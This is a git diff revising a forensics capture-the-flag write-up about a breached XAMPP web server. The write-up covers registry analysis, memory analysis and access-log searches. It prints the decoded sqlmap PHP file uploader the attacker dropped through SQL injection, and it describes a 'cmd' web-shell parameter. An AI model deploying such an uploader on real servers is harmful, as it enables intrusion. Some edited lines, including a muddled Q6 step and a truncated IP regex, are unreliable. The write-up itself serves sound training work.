@@ -15,35 +15,26 @@ https://cyberdefenders.org/labs/23
     -  	Memory analysis 
     -  	FTK Imager 
     
-    
+ 
 
 ## Scenario
 > A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. As a security analyst, you are tasked with mounting the image to determine how the system was compromised and the actions/commands the attacker executed.
-## TO add tool
 
 ## Tools Used
     • FTK Imager
-        ◦ FTK® Imager is a data preview and imaging tool
-    • Chromecacheview
-        ◦ ChromeCacheView is a small utility that reads the cache folder of Google Chrome Web browser, and displays the list of all files currently stored in the cache
+        ◦ FTK® Imager is a data preview and imaging tool.
+    • Volatility
+        ◦ Volatility is an open-source memory forensics framework for incident response and malware analysis.
     • Regripper 
         ◦ RegRipper is an open source tool, written in Perl, for extracting/parsing information (keys, values, data) from the Registry and presenting it for analysis
-    • browsinghistoryview
-        ◦ BrowsingHistoryView is a utility that reads the history data of different Web browsers (Mozilla Firefox, Google Chrome, Internet Explorer, Microsoft Edge, Opera)
-    • hashcat
-        ◦ Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms
-    • Shellbags Explorer
-        ◦GUI for browsing shellbags data. Handles locked files
-    • samdump2
-         ◦This tool is designed to dump Windows password hashes from a SAM file
-         
+    • Cyberchef
+        ◦ The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.
+        
          
  ## Questions:  
   	
 ### 1 	What is the computer's name?
-I used `Regripper` to extract the information from the registry hive into readable text file, the files location `\Windows\System32\config\`
-
-Open the `SOFTWARE` file to get the computer name
+I used `Regripper` to extract the information from the `SOFTWARE` file into readable text file, the files location `\Windows\System32\config\`
 
 #### Registry Path:
 > HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName
@@ -53,9 +44,7 @@ Open the `SOFTWARE` file to get the computer name
 > **Flag: WIN-L0ZZQ76PMUF**
 
 ### 2 	What is the Timezone of the compromised machine? Format: UTC+0 (no-space)
-I used `Regripper` to extract the information from the registry hive into readable text file, the files location `\Windows\System32\config\`
-
-Open the `SYSTEM` file to get the machine timezone
+I used `Regripper` to extract the information from the `SYSTEM` file into readable text file, the files location `\Windows\System32\config\`
 
 ### Registry Path:
 > HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation
@@ -104,8 +93,7 @@ The line contain XSS attempt
 
 
 ### 4 	What is the OS build number?
-I used `Regripper` to extract the information from the registry hive into readable text file, the files location `\Windows\System32\config\`
-Open the `SOFTWARE` file to get the os build
+I used `Regripper` to extract the information from the `SOFTWARE` file into readable text file, the files location `\Windows\System32\config\`
 
 #### Registry Path:
 > HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
@@ -115,8 +103,7 @@ Open the `SOFTWARE` file to get the os build
 > **Flag: 6001**
 
 ### 5 	How many users are on the compromised machine?
-I used `Regripper` to extract the information from the registry hive into readable text file, the files location `\Windows\System32\config\`
-Open the `SAM` file to get the list of the users 
+I used `Regripper` to extract the information from the `SAM` file into readable text file, the files location `\Windows\System32\config\`
 
 > SAM file is database used to store user account information, including password, account groups, access rights, and special privileges in Windows operating system.
 
@@ -125,8 +112,7 @@ Open the `SAM` file to get the list of the users
 > **Flag: 4**
 
 ### 6 	What is the webserver package installed on the machine?
-I used `Regripper` to extract the information from the registry hive into readable text file, the files location `\Windows\System32\config\`
-I used the `SOFTWARE` file to get the list of installed Programs
+I used `SOFTWARE` to extract the information from the `SAM` file into readable text file, the files location `\Windows\System32\config\`
 
 #### Registry Path:
 > For 32bit system: Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall 
@@ -232,8 +218,7 @@ The command is used to open the `RDP` service in `Windows Firewall`
 
 ### 11 How many users were added by the attacker?
  To find the users on the muchine used the `SAM` file
- first i ran the `hivelist` command 
- 
+ First i ran the `hivelist` command 
   
  #### Explanation:
  > To locate the virtual addresses of registry hives in memory, and the full paths to the corresponding hive on disk, use the `hivelist` command. If you want to print values from a certain hive, run this command first so you can see the address of the hives.
@@ -279,10 +264,9 @@ https://attack.mitre.org/techniques/T1136/001/
 > **Flag:  T1136.001**
 
 ### 15 The attacker uploaded a simple command shell through file upload vulnerability. Provide the name of the URL parameter used to execute commands?
-Because i am familiar with web shells, i know there is simple php web shell that work by execute commands that are being passed through ‘cmd’ HTTP request GET parameter.
+Because i am familiar with web shells, i know there is simple php web shell that work by execute commands that are being passed through ‘cmd’ HTTP GET request  parameter.
 
 ![q15a](/Injector/Images/q15a.png)
-
 
 So i search for `cmd=` in the access log.
 
@@ -291,7 +275,7 @@ So i search for `cmd=` in the access log.
 > **Flag: cmd**
 
 ### 16 One of the uploaded files by the attacker has an md5 that starts with "559411". Provide the full hash.
-
+I used FTK Imager to see all the file in vulnerable Web Application folder.
 
 ![q16](/Injector/Images/q16.png)
 
@@ -299,9 +283,38 @@ So i search for `cmd=` in the access log.
 
 ### 17 The attacker used Command Injection to add user "hacker" to the "Remote Desktop Users" Group. Provide the IP address that was part of the executed command?
 
+I used regex to find the different ip in access.log 
+
+`((?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0`
+
+![q17](/Injector/Images/q17.png)
+
 > **Flag:  192.168.56.102**
 
 ### 18 The attacker dropped a shellcode through SQLi vulnerability. The shellcode was checking for a specific version of PHP. Provide the PHP version number?
+I familiar with `sqlmap` ,and to write file through sql injection you need to use `INTO OUTFILE`
+
+
+#### Explanation:
+> SELECT `INTO OUTFILE` writes the resulting rows to a file, and allows the use of column and row terminators to specify a particular output format.
+
+So i search for `OUTFILE` in the access log.
+
+![q18a](/Injector/Images/q18a.png)
+
+After i used `url decoding` , i can see the code cleary
+
+![q18](/Injector/Images/q18.png)
+
+I saw the code is `hexadecimal` so i used `Cyberchef` to decode him
+
+![q18b](/Injector/Images/q18b.png)
+
+`<?php
+if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=\\xampp\\htdocs\\> <input type=submit name=upload value=upload></form>";}?>
+`
+
+We can see the command for checking a specific version of PHP
 
 > **Flag:  4.1.0**
 
